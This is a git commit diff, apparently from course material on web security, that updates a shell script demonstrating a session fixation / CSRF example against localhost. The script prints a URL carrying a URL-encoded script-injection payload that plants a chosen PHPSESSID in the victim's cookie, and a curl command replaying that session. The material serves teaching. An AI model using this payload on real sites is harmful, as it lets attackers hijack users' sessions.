42f28c7d91846c6c989003c6b65bdd3f2a1da0a5
ybktr <taro.yabuki@it-chiba.ac.jp>
2024-09-29 19:47:23 +0900

    CSRFの例の更新

--- 07-09/create-session.sh
+++ 07-09/create-session.sh
@@ -8,5 +8,5 @@ session_id=$(echo "$response" | grep -oP '(?<=PHPSESSID=)[^;]+')
 
 # 抽出した PHPSESSID を用いて指定された2つの文字列を出力
 echo "http://localhost/hello.php?username=%3Cscript%3Edocument.cookie%3D'PHPSESSID%3D$session_id'%3B%3C%2Fscript%3E"
-echo "http://localhost/rename.php"
+echo "http://localhost/session.php?username=Yabuki"
 echo "curl http://localhost/session.php -H 'Cookie: PHPSESSID=$session_id'"
